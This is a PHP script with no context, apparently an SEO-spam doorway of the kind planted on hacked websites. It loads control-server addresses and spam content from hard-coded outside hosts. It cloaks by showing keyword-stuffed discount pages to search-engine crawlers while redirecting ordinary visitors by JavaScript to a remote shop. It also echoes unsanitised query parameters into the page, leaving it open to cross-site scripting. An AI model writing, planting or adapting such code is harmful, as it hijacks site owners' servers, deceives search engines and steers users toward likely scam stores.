<?php

error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);
$http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';

$sitemap_ = $http_type . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "?s=s";
$kgurl="https://ilx01.com/4.txt";
$kgurl2="http://ilx01.top/jd4.txt";
$allurl =file_get_contents($kgurl);
if(!$allurl){$allurl=file_get_contents($kgurl2);}
$words = explode("|", $allurl);
foreach ($words  as  $value){
$aaa =file_get_contents($value.'test.txt');if(!$aaa){continue;}else{$jd=$value;break;	}}
$jd=str_replace('https://',$http_type,$jd);

$sz = "1";
$hyzhdy = $jd . "jd999.aspx";

if (!is_null($_GET['s'])) {
  $cid = mt_rand(1, 71);
  if (!is_null($_GET['cid'])) {
    $cid = $_GET['cid'];
  }
  $url = $jd."sjd888.aspx?cid=" . $cid . "&number=" . $_GET['number'] . "&pnum=" . $_GET['pnum'];
  $str = file_get_contents($url);
  $str = str_replace('yymm', $http_type . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'], $str);
  $str = str_replace('cname', 'keywords', $str);
  header("Content-type:text/xml");
  echo $str;
  exit();
}

$kname = "";
if (!is_null($_GET['keywords'])) {
  $kname = urldecode($_GET['keywords']);
}
$ip = GetIp();
if (!is_null($_GET['kk'])) {
  $ip = "66.249.64.190";
}
$domain = file_get_contents($jd."getdomain.aspx?rnd=1&ip=".$ip);

$ddd = $jd . "a.aspx";
if (stripos($domain, 'google') != false or stripos($domain, 'msn.com') != false or stripos($domain, 'yahoo.com') != false or stripos($domain, 'aol.com') != false or stripos($domain, 'yandex') != false) {
} else {
  if (!is_null($_GET['iid']) || !is_null($_GET['keywords'])) {
    $kname = urldecode($_GET['keywords']);
    echo '<script>document.location="' . $ddd . "?cid=" . $_GET['cid'] . "&cname=" . urlencode($kname) . '"</script>';
    exit();
  }
  if (!is_null($_GET['tag']) || !is_null($_GET['search']) || !is_null($_GET['cid'])) {
    $txt = str_replace("products.aspx", "", $ddd) . "?cid=" . $_GET['cid'] . "";
    echo '<script>document.location="' . $txt . '"</script>';
    exit();
  }
}
function GetIp()
{
	$ip = $_SERVER['REMOTE_ADDR'] . "*" . $_SERVER['REMOTE_HOST'] . "*" . $_SERVER['HTTP_CLIENT_IP'] . "*" . $_SERVER['HTTP_X_FORWARDED'] . "*" . $_SERVER['HTTP_FORWARDED_FOR'] . "*" . $_SERVER['HTTP_FORWARDED'];
	return $ip;
}
if (!is_null($_GET['iid'])) {

  $hyzhdy = $hyzhdy . "?iid=" . urlencode($_GET['iid']) . "&cid=" . $_GET['cid'];
} else if (!is_null($_GET['keywords'])) {
  $hyzhdy = $hyzhdy . "?keywords=" . urlencode($_GET['keywords']) . "&cid=" . $_GET['cid'] . "&yt=" . $jd . "ytb.txt&you=1";
} else {
  if (!is_null($_GET['search'])) {
    $hyzhdy = $hyzhdy . "?cid=" . $_GET['cid']."&search=".$_GET['search'];
  }

  if (!is_null($_GET['tag'])) {
	$hyzhdy = $hyzhdy . "?cid=" . $_GET['cid']."&tag=".$_GET['tag'];
  }
  else
  {
	$hyzhdy = $hyzhdy . "?cid=" . $_GET['cid'];
  }
}
$str = file_get_contents($hyzhdy);
$carr=preg_split('/镍/',$str);
$bttt=$carr[1];
if($kname=='' && is_null($_GET['search'])){
  $kname=$bttt;
}
?>
<html>

<head>

  <title><?php error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);
          echo $kname ?> <?php echo $_GET['search'] ?> Cheap Sell - OFF <?php echo mt_rand(50, 70) ?>% <?php echo $_GET['tag'] ?> </title>
  <meta name="keywords" content="<?php echo $kname ?> <?php echo $_GET['search'] ?>" />
  <meta name="description" content="<?php echo $kname ?> <?php echo $_GET['search'] ?> > Gold, White, Black, Red, Blue, Beige, Grey, Price, Rose, Orange, Purple, Green, Yellow, Cyan, Bordeaux, pink, Indigo, Brown, Silver,Electronics, Video Games, Computers, Cell Phones, Toys, Games, Apparel, Accessories, Shoes, Jewelry, Watches, Office Products, Sports & Outdoors, Sporting Goods, Baby Products, Health, Personal Care, Beauty, Home, Garden, Bed & Bath, Furniture, Tools, Hardware, Vacuums, Outdoor Living, Automotive Parts, Pet Supplies, Broadband, DSL, Books, Book Store, Magazine, Subscription, Music, CDs, DVDs, Videos,Online Shopping " />
  <meta name="robots" content="index,follow,all" />
  <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <link rel="sitemap" type="application/xml" title="Sitemap" href="<?php echo $sitemap_ ?>" />
</head>

<body>

  <?php

  $str=$carr[0];
  $str = str_replace('IIIII', $http_type . $_SERVER['HTTP_HOST'], $str);
  $str = str_replace('UUUUU', $http_type . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'], $str);
  $str = str_replace('HHHHH', $http_type . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'], $str);
  $str = str_replace('BBBBB', $_SERVER['HTTP_HOST'], $str);
  $str = str_replace('NNNNN', $kname, $str);
  $str = str_replace('SSSSS', $kname.$_GET['tag'], $str);
  echo $str;
  ?>

</body>

</html>